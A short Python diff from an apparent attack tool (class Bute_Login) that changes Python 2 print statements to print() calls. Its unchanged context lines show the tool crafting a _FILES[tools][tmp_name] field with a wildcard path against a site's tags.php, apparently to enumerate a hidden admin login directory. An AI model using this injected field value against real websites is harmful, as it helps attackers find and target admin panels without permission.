@@ -66,7 +66,7 @@ class Bute_Login:
 
         def Bute(self):
                 f_name = self.Check()
-                #print f_name
+                print(f_name)
                 if f_name != False:
                         if f_name == "/tags.php":
                                 prefix = "./"
@@ -109,11 +109,11 @@ class Bute_Login:
                                                 data["_FILES[tools][tmp_name]"] = "%s{p}<</images/adminico.gif"%prefix
                         show_message['Login_url'] = self.target+"/%s"%back_dir
                         
-                        print show_message
+                        print(show_message)
                         return show_message
                 else:
                         check_message['Enumerate'] = False
-                        print check_message
+                        print(check_message)
                         return check_message
 
 
